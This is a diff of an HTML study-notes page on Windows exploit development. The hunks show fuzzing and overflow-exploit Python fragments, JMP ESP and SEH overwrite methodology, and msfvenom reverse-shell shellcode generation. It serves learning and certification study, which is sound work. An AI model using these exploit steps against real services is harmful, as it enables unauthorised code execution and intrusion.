@@ -25,21 +25,12 @@
   <meta name="twitter:description" content="Windows User Mode Exploit Development study notes.">
   <meta name="twitter:image" content="./img/osed_icon.svg">
   <style>
-  .section-flow-1,.section-flow-2,.section-flow-3,.section-flow-4,.section-flow-5,
-  .section-flow-6,.section-flow-7,.section-flow-8,.section-flow-9,.section-flow-10,
-  .section-flow-11{background-color:#008080;}
-  .section-flow-1 .dropdown-container,.section-flow-2 .dropdown-container,.section-flow-3 .dropdown-container,
-  .section-flow-4 .dropdown-container,.section-flow-5 .dropdown-container,.section-flow-6 .dropdown-container,
-  .section-flow-7 .dropdown-container,.section-flow-8 .dropdown-container,.section-flow-9 .dropdown-container,
-  .section-flow-10 .dropdown-container,.section-flow-11 .dropdown-container,
-  .section-flow-1 .nested-dropdown-container,.section-flow-2 .nested-dropdown-container,
-  .section-flow-3 .nested-dropdown-container,.section-flow-4 .nested-dropdown-container,
-  .section-flow-5 .nested-dropdown-container,.section-flow-6 .nested-dropdown-container,
-  .section-flow-7 .nested-dropdown-container,.section-flow-8 .nested-dropdown-container,
-  .section-flow-9 .nested-dropdown-container,.section-flow-10 .nested-dropdown-container,
-  .section-flow-11 .nested-dropdown-container{background-color:#008080;}
+  .index .section-flow-1,.index .section-flow-2,.index .section-flow-3,.index .section-flow-4,.index .section-flow-5,.index .section-flow-6,.index .section-flow-7,.index .section-flow-8,.index .section-flow-9,.index .section-flow-10,.index .section-flow-11{background-color:#008080;}
+  .index .section-flow-1 .dropdown-container,.index .section-flow-2 .dropdown-container,.index .section-flow-3 .dropdown-container,.index .section-flow-4 .dropdown-container,.index .section-flow-5 .dropdown-container,.index .section-flow-6 .dropdown-container,.index .section-flow-7 .dropdown-container,.index .section-flow-8 .dropdown-container,.index .section-flow-9 .dropdown-container,.index .section-flow-10 .dropdown-container,.index .section-flow-11 .dropdown-container,.index .section-flow-1 .nested-dropdown-container,.index .section-flow-2 .nested-dropdown-container,.index .section-flow-3 .nested-dropdown-container,.index .section-flow-4 .nested-dropdown-container,.index .section-flow-5 .nested-dropdown-container,.index .section-flow-6 .nested-dropdown-container,.index .section-flow-7 .nested-dropdown-container,.index .section-flow-8 .nested-dropdown-container,.index .section-flow-9 .nested-dropdown-container,.index .section-flow-10 .nested-dropdown-container,.index .section-flow-11 .nested-dropdown-container{background-color:#008080;}
   .index{background-color:#008080;}
   .index-btn{background-color:#008080;}
+  .cheatsheet-content [class^="section-flow"]{background-color:#ffffff;}
+  .cheatsheet-content [class^="section-flow"] .dropdown-container,.cheatsheet-content [class^="section-flow"] .nested-dropdown-container{background-color:#ffffff;}
   .cheatsheet-content img{max-width:520px;width:100%;height:auto;display:block;margin:0.5rem 0;}
   .cheatsheet-content figure{margin:0.8rem 0;padding:0;}
   .cheatsheet-content h2{margin-top:3.5rem;margin-bottom:1rem;}
@@ -106,7 +97,7 @@
 
 <p>The x86 architecture provides eight 32-bit general-purpose registers, a 32-bit instruction pointer (EIP), and a 32-bit flags register (EFLAGS). Each general-purpose register can be accessed as a full 32-bit value (EAX), a 16-bit lower half (AX), or as individual 8-bit high/low pairs (AH/AL). Understanding register roles is essential for following exploit payloads, ROP chains, and shellcode execution flow.</p>
 
-<p>EAX typically holds return values from function calls and is the accumulator for arithmetic. ECX serves as a loop counter. EDX extends EAX for 64-bit multiplication and division results. ESI and EDI are source and destination pointers for string operations (MOVS, CMPS, SCAS). EBP anchors the current stack frame, and ESP always points to the top of the stack. EIP cannot be directly modified — it advances automatically as instructions execute, but overwriting a saved return address on the stack redirects it after a RET instruction.</p>
+<p>EAX typically holds return values from function calls and is the accumulator for arithmetic. ECX serves as a loop counter. EDX extends EAX for 64-bit multiplication and division results. ESI and EDI are source and destination pointers for string operations (MOVS, CMPS, SCAS). EBP anchors the current stack frame, and ESP always points to the top of the stack. EIP cannot be directly modified - it advances automatically as instructions execute, but overwriting a saved return address on the stack redirects it after a RET instruction.</p>
 
 <table class="custom-table">
 <thead><tr><th>Register</th><th>Purpose</th><th>Sub-registers</th></tr></thead>
@@ -117,15 +108,14 @@
 <tr><td>EDX</td><td>Data register, I/O operations, extends EAX</td><td>DX, DH/DL</td></tr>
 <tr><td>ESI</td><td>Source index for string operations</td><td>SI</td></tr>
 <tr><td>EDI</td><td>Destination index for string operations</td><td>DI</td></tr>
-<tr><td>EBP</td><td>Base pointer — anchors the stack frame</td><td>BP</td></tr>
-<tr><td>ESP</td><td>Stack pointer — top of stack</td><td>SP</td></tr>
-<tr><td>EIP</td><td>Instruction pointer — next instruction to execute</td><td>IP</td></tr>
+<tr><td>EBP</td><td>Base pointer - anchors the stack frame</td><td>BP</td></tr>
+<tr><td>ESP</td><td>Stack pointer - top of stack</td><td>SP</td></tr>
+<tr><td>EIP</td><td>Instruction pointer - next instruction to execute</td><td>IP</td></tr>
 <tr><td>EFLAGS</td><td>Status flags (ZF, CF, SF, OF, TF, DF)</td><td>FLAGS (16-bit)</td></tr>
 </tbody>
 </table>
 
-<p>The EFLAGS register contains individual bit flags set by arithmetic and comparison instructions. The Zero Flag (ZF) is set when an operation produces zero — conditional jumps like JZ and JNZ branch on this flag. The Carry Flag (CF) indicates unsigned overflow. The Sign Flag (SF) reflects the most significant bit of a result. The Overflow Flag (OF) signals signed overflow. The Trap Flag (TF) enables single-step debugging — WinDbg sets this internally when using the <code>t</code> (trace) command.</p>
-
+<p>The EFLAGS register contains individual bit flags set by arithmetic and comparison instructions. The Zero Flag (ZF) is set when an operation produces zero - conditional jumps like JZ and JNZ branch on this flag. The Carry Flag (CF) indicates unsigned overflow. The Sign Flag (SF) reflects the most significant bit of a result. The Overflow Flag (OF) signals signed overflow. The Trap Flag (TF) enables single-step debugging - WinDbg sets this internally when using the <code>t</code> (trace) command.</p>
 <table class="custom-table">
 <thead><tr><th>Flag</th><th>Bit</th><th>Set When</th><th>Used By</th></tr></thead>
 <tbody>
@@ -168,7 +158,8 @@ r eip=deadbeef</code></pre>
 
 <h3 id="x86-memory">1.2 x86 Memory Layout</h3>
 
-<p>A Windows process is laid out in a 4 GB virtual address space (with default 2 GB user-mode / 2 GB kernel split). The lower addresses hold the PE image sections (.text for executable code, .data for initialized globals, .bss for uninitialized globals, .rdata for read-only data and import tables). The heap grows upward from lower addresses and is used for dynamic allocations via HeapAlloc/malloc. The stack occupies high user-mode addresses and grows downward — each new PUSH decrements ESP by 4 bytes, and each POP increments it.</p>
+<p>A Windows process is laid out in a 4 GB virtual address space (with default 2 GB user-mode / 2 GB kernel split). The lower addresses hold the PE image sections (.text for executable code, .data for initialized globals, .bss for uninitialized globals, .rdata for read-only data and import tables). The heap grows upward from lower addresses and is used for dynamic allocations via HeapAlloc/malloc. The stack occupies high user-mode addresses and grows downward - each new PUSH decrements ESP by 4 bytes, and each POP increments it.</p>
+<figure><img src="./img/osed/fig001-anatomy-of-program-memory-in-windows.png" alt="Anatomy of program memory in Windows"></figure>
 
 <p>The Thread Environment Block (TEB) at <code>fs:[0]</code> holds the pointer to the SEH chain, the stack base and limit, and a pointer to the Process Environment Block (PEB). The PEB contains the image base address, the loader data structures (InMemoryOrderModuleList) used to walk loaded DLLs, and process parameters. Shellcode commonly traverses the PEB to find kernel32.dll's base address at runtime.</p>
 
@@ -225,9 +216,9 @@ lm v</code></pre>
 
 <h3 id="x86-instructions">1.3 x86 Instruction Set</h3>
 
-<p>Exploit development requires fluency with a core set of x86 instructions. Data movement instructions (MOV, PUSH, POP, LEA, XCHG) transfer values between registers, memory, and the stack. Arithmetic instructions (ADD, SUB, INC, DEC, MUL, DIV) perform calculations and set EFLAGS accordingly. Logic instructions (AND, OR, XOR, NOT, SHL, SHR) are used for bitwise operations — XOR EAX, EAX is the standard idiom for zeroing a register without introducing null bytes.</p>
+<p>Exploit development requires fluency with a core set of x86 instructions. Data movement instructions (MOV, PUSH, POP, LEA, XCHG) transfer values between registers, memory, and the stack. Arithmetic instructions (ADD, SUB, INC, DEC, MUL, DIV) perform calculations and set EFLAGS accordingly. Logic instructions (AND, OR, XOR, NOT, SHL, SHR) are used for bitwise operations - XOR EAX, EAX is the standard idiom for zeroing a register without introducing null bytes.</p>
 
-<p>Control flow instructions (JMP, Jcc, CALL, RET, LOOP) redirect execution. CALL pushes the return address (address of the next instruction) onto the stack and jumps to the target. RET pops the top of the stack into EIP, which is the fundamental mechanism exploits abuse — overwriting the saved return address on the stack causes RET to redirect execution to attacker-controlled code. NOP (0x90) is a single-byte instruction that does nothing and advances EIP by one, forming NOP sleds in exploits.</p>
+<p>Control flow instructions (JMP, Jcc, CALL, RET, LOOP) redirect execution. CALL pushes the return address (address of the next instruction) onto the stack and jumps to the target. RET pops the top of the stack into EIP, which is the fundamental mechanism exploits abuse - overwriting the saved return address on the stack causes RET to redirect execution to attacker-controlled code. NOP (0x90) is a single-byte instruction that does nothing and advances EIP by one, forming NOP sleds in exploits.</p>
 
 <table class="custom-table">
 <thead><tr><th>Instruction</th><th>Opcode(s)</th><th>Operation</th></tr></thead>
@@ -344,26 +335,26 @@ call MessageBoxA  ; callee cleans stack internally with RET 10h</code></pre>
 dd esp L8</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Before CALL (after args pushed):</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+0]</code> = last arg pushed (first parameter)</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+4]</code> = second parameter</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+8]</code> = next parameter, if present</label></li>
+    <li><label><input type="checkbox"> [ESP+0]  = last arg pushed (first parameter)</label></li>
+    <li><label><input type="checkbox"> [ESP+4]  = second parameter</label></li>
+    <li><label><input type="checkbox"> [ESP+8]  = ...</label></li>
     <li><label><input type="checkbox"> After CALL (inside callee, after prologue):</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+0]</code> = saved EBP</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+4]</code> = return address</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+8]</code> = first parameter</label></li>
-    <li><label><input type="checkbox"> <code>[ESP+C]</code> = second parameter</label></li>
+    <li><label><input type="checkbox"> [ESP+0]  = saved EBP</label></li>
+    <li><label><input type="checkbox"> [ESP+4]  = return address</label></li>
+    <li><label><input type="checkbox"> [ESP+8]  = first parameter</label></li>
+    <li><label><input type="checkbox"> [ESP+C]  = second parameter</label></li>
     <li><label><input type="checkbox"> Or reference from EBP:</label></li>
-    <li><label><input type="checkbox"> <code>[EBP+0]</code> = saved EBP</label></li>
-    <li><label><input type="checkbox"> <code>[EBP+4]</code> = return address</label></li>
-    <li><label><input type="checkbox"> <code>[EBP+8]</code> = first parameter</label></li>
-    <li><label><input type="checkbox"> <code>[EBP-4]</code> = first local variable</label></li>
+    <li><label><input type="checkbox"> [EBP+0]  = saved EBP</label></li>
+    <li><label><input type="checkbox"> [EBP+4]  = return address</label></li>
+    <li><label><input type="checkbox"> [EBP+8]  = first parameter</label></li>
+    <li><label><input type="checkbox"> [EBP-4]  = first local variable</label></li>
     </ul>
   </li>
 </ul>
 
 <h3 id="windbg-setup">1.5 WinDbg Setup and Configuration</h3>
 
-<p>WinDbg is Microsoft's primary user-mode and kernel-mode debugger. For OSED, it is the tool of choice for all exploit development tasks — crash analysis, breakpoint-based flow tracing, and memory inspection during payload development. Install WinDbg Preview from the Microsoft Store or download the classic version from the Windows SDK installer. The debugger must be configured with a symbol path so that it can resolve function names for system DLLs.</p>
+<p>WinDbg is Microsoft's primary user-mode and kernel-mode debugger. For OSED, it is the tool of choice for all exploit development tasks - crash analysis, breakpoint-based flow tracing, and memory inspection during payload development. Install WinDbg Preview from the Microsoft Store or download the classic version from the Windows SDK installer. The debugger must be configured with a symbol path so that it can resolve function names for system DLLs.</p>
 
 <p>The Microsoft symbol server provides PDB files for all Windows system libraries. Configuring the symbol path with <code>srv*</code> syntax tells WinDbg to download symbols on demand and cache them locally. Set the <code>_NT_SYMBOL_PATH</code> environment variable system-wide so that every WinDbg session inherits the configuration. When debugging a target application, attach to an existing process (noninvasive or invasive) or launch it directly under the debugger.</p>
 
@@ -511,7 +502,7 @@ dt ntdll!_PEB Ldr @$peb</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Set a deferred breakpoint on a function in a module that is not yet loaded</label>
-    <pre><code class="language-bash"># bu persists across module load/unload — resolves when the module loads:
+    <pre><code class="language-bash"># bu persists across module load/unload - resolves when the module loads:
 bu mymodule!FunctionName
 # Useful for DLLs loaded on-demand:
 bu ws2_32!recv</code></pre>
@@ -520,7 +511,7 @@ bu ws2_32!recv</code></pre>
 
 <h3 id="windbg-debugging">1.7 Debugging a Running Process</h3>
 
-<p>When developing an exploit, the typical workflow involves attaching WinDbg to the target application, setting breakpoints on the vulnerable function or the point where user input is processed, sending the payload, and examining the resulting state. Breakpoints can be set on addresses, function names, or memory access patterns. Hardware breakpoints (ba) fire on read, write, or execute access to a specific address — useful for catching when a buffer is accessed without modifying the code.</p>
+<p>When developing an exploit, the typical workflow involves attaching WinDbg to the target application, setting breakpoints on the vulnerable function or the point where user input is processed, sending the payload, and examining the resulting state. Breakpoints can be set on addresses, function names, or memory access patterns. Hardware breakpoints (ba) fire on read, write, or execute access to a specific address - useful for catching when a buffer is accessed without modifying the code.</p>
 
 <p>After a crash, WinDbg displays the faulting instruction and register state. The <code>!analyze -v</code> command performs automated crash analysis, identifying the exception type, faulting address, and a preliminary stack trace. For access violations during exploit development, the key information is the value in EIP (to confirm control), the state of ESP (to find the shellcode landing zone), and whether the exception was a read or write violation.</p>
 
@@ -548,10 +539,10 @@ g</code></pre>
     <pre><code class="language-bash">!analyze -v</code></pre>
   </li>
   <li>
-    <label><input type="checkbox"> Examine the crash state — verify EIP overwrite and locate ESP</label>
+    <label><input type="checkbox"> Examine the crash state - verify EIP overwrite and locate ESP</label>
     <pre><code class="language-bash">r
 # Check if EIP contains a recognizable pattern (e.g., 41414141)
-# Note ESP value — this is where shellcode will land after JMP ESP
+# Note ESP value - this is where shellcode will land after JMP ESP
 dd esp L20</code></pre>
   </li>
   <li>
@@ -627,7 +618,7 @@ g</code></pre>
   </li>
 </ul>
 
-<p>WinDbg provides pseudo registers — predefined aliases that simplify expressions and scripting. User-defined pseudo registers (<code>$t0</code> through <code>$t19</code>) store intermediate values during debugging sessions. Built-in aliases like <code>$ip</code>, <code>$peb</code>, and <code>$teb</code> reference the current instruction pointer and key OS structures without requiring hardcoded addresses.</p>
+<p>WinDbg provides pseudo registers - predefined aliases that simplify expressions and scripting. User-defined pseudo registers (<code>$t0</code> through <code>$t19</code>) store intermediate values during debugging sessions. Built-in aliases like <code>$ip</code>, <code>$peb</code>, and <code>$teb</code> reference the current instruction pointer and key OS structures without requiring hardcoded addresses.</p>
 
 <table class="custom-table">
 <thead><tr><th>Pseudo Register</th><th>Description</th><th>Example Usage</th></tr></thead>
@@ -668,18 +659,19 @@ bp ws2_32!recv ".if (poi(esp+0xc) > 0x200) {} .else {gc}"</code></pre>
 <h3 id="stack-frame">2.1 Understanding the Stack Frame</h3>
 
 <p>Every function call creates a stack frame that holds the function's local variables, saved register state, and the return address. When a function is called with CALL, the processor pushes the address of the next instruction (the return address) onto the stack. The called function's prologue then pushes the caller's EBP (saved frame pointer) and sets EBP to the current ESP, establishing a reference point for accessing both parameters (at positive offsets from EBP) and local variables (at negative offsets).</p>
+<figure><img src="./img/osed/fig014-stack-layout-before-and-after-copy.png" alt="Stack layout before and after copy"></figure>
 
 <p>A stack buffer overflow occurs when a function writes more data to a stack-allocated buffer than the buffer can hold. Because local variables sit between ESP and the saved EBP/return address, an overflow that writes past the buffer's boundary first corrupts adjacent local variables, then overwrites the saved EBP, and finally overwrites the return address. When the function executes its epilogue (LEAVE; RET), the corrupted return address is popped into EIP, redirecting execution to an attacker-controlled address.</p>
 
 <table class="custom-table">
 <thead><tr><th>Stack Offset (from EBP)</th><th>Contents</th><th>Overflow Order</th></tr></thead>
 <tbody>
-<tr><td>[EBP - N]</td><td>Local buffer (N bytes)</td><td>1st — filled by input</td></tr>
-<tr><td>[EBP - M]</td><td>Other local variables</td><td>2nd — corrupted by overflow</td></tr>
-<tr><td>[EBP + 0]</td><td>Saved EBP (caller's frame pointer)</td><td>3rd — overwritten</td></tr>
-<tr><td>[EBP + 4]</td><td>Return address (EIP after RET)</td><td>4th — attacker controls EIP</td></tr>
-<tr><td>[EBP + 8]</td><td>Function parameter 1</td><td>5th — may be overwritten</td></tr>
-<tr><td>[EBP + C]</td><td>Function parameter 2</td><td>6th — may be overwritten</td></tr>
+<tr><td>[EBP - N]</td><td>Local buffer (N bytes)</td><td>1st - filled by input</td></tr>
+<tr><td>[EBP - M]</td><td>Other local variables</td><td>2nd - corrupted by overflow</td></tr>
+<tr><td>[EBP + 0]</td><td>Saved EBP (caller's frame pointer)</td><td>3rd - overwritten</td></tr>
+<tr><td>[EBP + 4]</td><td>Return address (EIP after RET)</td><td>4th - attacker controls EIP</td></tr>
+<tr><td>[EBP + 8]</td><td>Function parameter 1</td><td>5th - may be overwritten</td></tr>
+<tr><td>[EBP + C]</td><td>Function parameter 2</td><td>6th - may be overwritten</td></tr>
 </tbody>
 </table>
 
@@ -716,10 +708,10 @@ dd ebp-100 L50
 <table class="custom-table">
 <thead><tr><th>Function</th><th>Risk</th><th>Safe Alternative</th></tr></thead>
 <tbody>
-<tr><td>strcpy(dst, src)</td><td>No length limit — copies until null terminator</td><td>strncpy, strcpy_s</td></tr>
-<tr><td><code>sprintf(buf, fmt, ...)</code></td><td>No output length limit</td><td><code>snprintf</code>, <code>sprintf_s</code></td></tr>
-<tr><td>gets(buf)</td><td>No length limit — reads until newline</td><td>fgets</td></tr>
-<tr><td>memcpy(dst, src, n)</td><td>Safe if n is validated — dangerous if n comes from user input</td><td>memcpy_s</td></tr>
+<tr><td>strcpy(dst, src)</td><td>No length limit - copies until null terminator</td><td>strncpy, strcpy_s</td></tr>
+<tr><td>sprintf(buf, fmt, ...)</td><td>No output length limit</td><td>snprintf, sprintf_s</td></tr>
+<tr><td>gets(buf)</td><td>No length limit - reads until newline</td><td>fgets</td></tr>
+<tr><td>memcpy(dst, src, n)</td><td>Safe if n is validated - dangerous if n comes from user input</td><td>memcpy_s</td></tr>
 <tr><td>strcat(dst, src)</td><td>Appends without checking remaining dst capacity</td><td>strncat, strcat_s</td></tr>
 <tr><td>scanf("%s", buf)</td><td>No field width limit</td><td>scanf("%255s", buf)</td></tr>
 <tr><td>lstrcpyA(dst, src)</td><td>Win32 unbounded string copy</td><td>StringCchCopy</td></tr>
@@ -751,7 +743,7 @@ da poi(esp)     ; destination address</code></pre>
     <pre><code class="language-bash">!address poi(esp)</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Check destination address:</label></li>
-    <li><label><input type="checkbox"> If the region is "Stack" — it's a stack overflow candidate</label></li>
+    <li><label><input type="checkbox"> If the region is "Stack" - it's a stack overflow candidate</label></li>
     <li><label><input type="checkbox"> Compare against ESP/EBP to confirm</label></li>
     </ul>
   </li>
@@ -787,7 +779,7 @@ while size &lt; 5000:
         s.send(prefix + buffer + b"\r\n")
         s.recv(1024)
         s.close()
-        print(f"[+] Sent {size} bytes — no crash")
+        print(f"[+] Sent {size} bytes - no crash")
     except Exception as e:
         print(f"[!] Crashed at {size} bytes: {e}")
         sys.exit(0)
@@ -937,9 +929,9 @@ s.close()</code></pre>
     <label><input type="checkbox"> In WinDbg, compare memory at ESP against the expected sequence</label>
     <pre><code class="language-bash">db esp L100</code></pre>
     <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> Look for the byte sequence continuing in order, starting with <code>01 02 03 04 05 06 07 08 09</code></label></li>
+    <li><label><input type="checkbox"> Look for the sequence: 01 02 03 04 05 06 07 08 09 ...</label></li>
     <li><label><input type="checkbox"> If a byte is missing, replaced, or followed by unexpected values, that byte is a bad character</label></li>
-    <li><label><input type="checkbox"> Example: if the sequence jumps from <code>09</code> to <code>0b 0c</code>, then <code>0x0a</code> is a bad character because it was skipped</label></li>
+    <li><label><input type="checkbox"> Example: if you see 01 02 03 04 05 06 07 08 09 0b 0c ... then 0x0a is a bad character (it was skipped)</label></li>
     </ul>
   </li>
   <li>
@@ -956,12 +948,12 @@ for i in range(1, 256):
 
 <h3 id="return-address">2.6 Finding a Return Address</h3>
 
-<p>After confirming EIP control and identifying bad characters, the exploit needs a reliable return address. For a vanilla stack overflow without DEP, the standard technique uses a JMP ESP gadget — an instruction at a fixed address in a loaded module that jumps to whatever ESP points to. After the RET instruction pops the overwritten return address into EIP and executes the JMP ESP, execution continues at ESP which points directly into the attacker's buffer (the C's section in the verification step). The JMP ESP address must not contain any bad characters and must reside in a module without ASLR, SafeSEH, or rebase protections.</p>
+<p>After confirming EIP control and identifying bad characters, the exploit needs a reliable return address. For a vanilla stack overflow without DEP, the standard technique uses a JMP ESP gadget - an instruction at a fixed address in a loaded module that jumps to whatever ESP points to. After the RET instruction pops the overwritten return address into EIP and executes the JMP ESP, execution continues at ESP which points directly into the attacker's buffer (the C's section in the verification step). The JMP ESP address must not contain any bad characters and must reside in a module without ASLR, SafeSEH, or rebase protections.</p>
 
 <table class="custom-table">
 <thead><tr><th>Gadget</th><th>Opcode Bytes</th><th>Use Case</th></tr></thead>
 <tbody>
-<tr><td>JMP ESP</td><td>FF E4</td><td>Standard — redirect to shellcode after return address</td></tr>
+<tr><td>JMP ESP</td><td>FF E4</td><td>Standard - redirect to shellcode after return address</td></tr>
 <tr><td>CALL ESP</td><td>FF D4</td><td>Alternative to JMP ESP (pushes return addr first)</td></tr>
 <tr><td>PUSH ESP; RET</td><td>54 C3</td><td>Two-instruction alternative</td></tr>
 <tr><td>JMP EAX</td><td>FF E0</td><td>If EAX points to controlled buffer</td></tr>
@@ -1000,7 +992,7 @@ s -b [base] L[size] ff e4</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> If bad chars are 0x00, 0x0a, 0x0d:</label></li>
     <li><label><input type="checkbox"> Address 625011AF → bytes AF 11 50 62 (little-endian)</label></li>
-    <li><label><input type="checkbox"> Check each byte: AF, 11, 50, 62 — none are bad chars ✓</label></li>
+    <li><label><input type="checkbox"> Check each byte: AF, 11, 50, 62 - none are bad chars ✓</label></li>
     </ul>
   </li>
   <li>
@@ -1028,7 +1020,7 @@ buffer += b"C" * (3000 - offset - 4 - 16)</code></pre>
 
 <h3 id="shellcode-generation">2.7 Generating and Encoding Shellcode</h3>
 
-<p>After confirming that the JMP ESP gadget redirects execution to the buffer and a NOP sled is reachable, the final step is replacing the C's with functional shellcode. Msfvenom generates shellcode for various payloads — reverse shells, bind shells, or staged payloads. The <code>-b</code> flag excludes bad characters from the encoded output. The <code>shikata_ga_nai</code> encoder produces polymorphic XOR-encoded shellcode with a decoder stub that unpacks the payload at runtime. The encoder requires a few bytes of writable memory after the payload for the decoding loop, which the NOP sled and trailing buffer space provide.</p>
+<p>After confirming that the JMP ESP gadget redirects execution to the buffer and a NOP sled is reachable, the final step is replacing the C's with functional shellcode. Msfvenom generates shellcode for various payloads - reverse shells, bind shells, or staged payloads. The <code>-b</code> flag excludes bad characters from the encoded output. The <code>shikata_ga_nai</code> encoder produces polymorphic XOR-encoded shellcode with a decoder stub that unpacks the payload at runtime. The encoder requires a few bytes of writable memory after the payload for the decoding loop, which the NOP sled and trailing buffer space provide.</p>
 
 <table class="custom-table">
 <thead><tr><th>Parameter</th><th>Flag</th><th>Example</th></tr></thead>
@@ -1045,7 +1037,7 @@ buffer += b"C" * (3000 - offset - 4 - 16)</code></pre>
 </tbody>
 </table>
 
-<p>The EXITFUNC parameter controls how the shellcode terminates after the payload runs. Setting <code>EXITFUNC=process</code> calls <code>ExitProcess</code>, which kills the entire application — acceptable for single-threaded programs but destructive for multi-threaded services. Setting <code>EXITFUNC=thread</code> calls <code>ExitThread</code>, which only terminates the current thread and keeps the target service running. For multi-threaded applications like Sync Breeze or web servers, always use <code>EXITFUNC=thread</code> to avoid crashing the service and to allow re-exploitation.</p>
+<p>The EXITFUNC parameter controls how the shellcode terminates after the payload runs. Setting <code>EXITFUNC=process</code> calls <code>ExitProcess</code>, which kills the entire application - acceptable for single-threaded programs but destructive for multi-threaded services. Setting <code>EXITFUNC=thread</code> calls <code>ExitThread</code>, which only terminates the current thread and keeps the target service running. For multi-threaded applications like Sync Breeze or web servers, always use <code>EXITFUNC=thread</code> to avoid crashing the service and to allow re-exploitation.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -1107,7 +1099,7 @@ s.connect((target_ip, target_port))
 s.recv(1024)
 s.send(b"COMMAND " + buffer + b"\r\n")
 s.close()
-print("[+] Exploit sent — check listener")</code></pre>
+print("[+] Exploit sent - check listener")</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Debug the final exploit by setting a breakpoint at the JMP ESP address</label>
@@ -1146,12 +1138,12 @@ python3 exploit.py</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Increase NOP sled if decoder needs more room:</label></li>
     <li><label><input type="checkbox"> If process crashes after shell, try EXITFUNC=process:</label></li>
-    <li><label><input type="checkbox"> Add <code>EXITFUNC=process</code> to the relevant <code>msfvenom</code> payload command</label></li>
+    <li><label><input type="checkbox"> msfvenom ... EXITFUNC=process ...</label></li>
     </ul>
   </li>
 </ul>
 <!-- ═══════════════════════════════════════════════════════════════════
-     MODULE 3 — Exploiting SEH Overflows
+     MODULE 3 - Exploiting SEH Overflows
      ═══════════════════════════════════════════════════════════════════ -->
 
 <h2 id="seh-overflows">3. Exploiting SEH Overflows</h2>
@@ -1168,7 +1160,7 @@ python3 exploit.py</code></pre>
 <tr><td>nSEH (Next)</td><td>+0x00</td><td>4 bytes</td><td>Pointer to the next _EXCEPTION_REGISTRATION_RECORD</td></tr>
 <tr><td>SEH (Handler)</td><td>+0x04</td><td>4 bytes</td><td>Pointer to the exception handler function</td></tr>
 <tr><td>TEB fs:[0]</td><td>0x00</td><td>4 bytes</td><td>Points to the head of the SEH chain for the current thread</td></tr>
-<tr><td>End-of-chain sentinel</td><td>—</td><td>4 bytes</td><td>nSEH = 0xFFFFFFFF indicates the last handler in the chain</td></tr>
+<tr><td>End-of-chain sentinel</td><td>-</td><td>4 bytes</td><td>nSEH = 0xFFFFFFFF indicates the last handler in the chain</td></tr>
 </tbody>
 </table>
 
@@ -1203,8 +1195,9 @@ g</code></pre>
 <h3 id="seh-chain">3.2 SEH Chain and the Default Handler</h3>
 
 <p>When an exception fires, the OS invokes <code>ntdll!KiUserExceptionDispatcher</code>, which calls <code>ntdll!RtlDispatchException</code>. This function iterates through the SEH chain, calling each handler with the exception record, the registration record, the context, and the dispatcher context. A handler returns <code>ExceptionContinueExecution</code> (0) to resume execution at the faulting instruction, or <code>ExceptionContinueSearch</code> (1) to pass the exception to the next handler in the chain.</p>
+<figure><img src="./img/osed/fig026-singlylinked-exceptionregistrationrecord-list.png" alt="Singly-linked _EXCEPTION_REGISTRATION_RECORD list"></figure>
 
-<p>If no handler claims the exception, the default handler <code>kernel32!UnhandledExceptionFilter</code> is invoked. In a debugger-attached scenario this transfers control to the debugger. Without a debugger, the process terminates with the familiar crash dialog. The critical insight for exploitation is that the nSEH and SEH fields live on the stack — a buffer overflow that reaches beyond the saved return address will overwrite these fields, redirecting exception handling to attacker-controlled code.</p>
+<p>If no handler claims the exception, the default handler <code>kernel32!UnhandledExceptionFilter</code> is invoked. In a debugger-attached scenario this transfers control to the debugger. Without a debugger, the process terminates with the familiar crash dialog. The critical insight for exploitation is that the nSEH and SEH fields live on the stack - a buffer overflow that reaches beyond the saved return address will overwrite these fields, redirecting exception handling to attacker-controlled code.</p>
 
 <table class="custom-table">
 <thead><tr><th>Handler Return Value</th><th>Constant</th><th>Effect</th></tr></thead>
@@ -1222,6 +1215,7 @@ g</code></pre>
     <pre><code class="language-bash">bp ntdll!RtlDispatchException
 g
 dd esp L4</code></pre>
+<figure><img src="./img/osed/fig027-seh-mechanism-in-action.png" alt="SEH Mechanism in action"></figure>
   </li>
   <li>
     <label><input type="checkbox"> Identify the default unhandled exception filter</label>
@@ -1239,7 +1233,8 @@ dd esp L100</code></pre>
 
 <h3 id="seh-overwrite">3.3 Triggering an SEH Overwrite</h3>
 
-<p>An SEH overflow exploit sends a payload large enough to overwrite the exception registration record on the stack. After overwriting nSEH and SEH, the exploit must also trigger an exception — typically by continuing to write past the end of the stack page, causing an access violation. The overflow itself may trigger the exception if the write extends into an unmapped memory region.</p>
+<p>An SEH overflow exploit sends a payload large enough to overwrite the exception registration record on the stack. After overwriting nSEH and SEH, the exploit must also trigger an exception - typically by continuing to write past the end of the stack page, causing an access violation. The overflow itself may trigger the exception if the write extends into an unmapped memory region.</p>
+<figure><img src="./img/osed/fig028-seh-mechanism-in-action.png" alt="SEH mechanism in action"></figure>
 
 <p>In WinDbg, <code>!exchain</code> after the crash will show the corrupted SEH chain. The nSEH field will contain part of the attacker-controlled pattern, and the SEH handler pointer will point to another section of the pattern. Using a unique pattern (Metasploit's <code>pattern_create</code> or mona's <code>!mona pattern_create</code>) allows precise calculation of the offset to both fields.</p>
 
@@ -1285,7 +1280,7 @@ s.close()</code></pre>
     <label><input type="checkbox"> Verify the offset by placing known values at nSEH and SEH</label>
     <pre><code class="language-python">offset = [nseh-offset]
 buf = b"A" * offset          # junk to reach nSEH
-buf += b"B" * 4              # nSEH — should appear in !exchain
+buf += b"B" * 4              # nSEH - should appear in !exchain
 buf += b"C" * 4              # SEH handler
 buf += b"D" * (total_len - len(buf))</code></pre>
   </li>
@@ -1302,9 +1297,9 @@ buf += b"D" * (total_len - len(buf))</code></pre>
 
 <h3 id="pop-pop-ret">3.4 Finding POP POP RET Gadgets</h3>
 
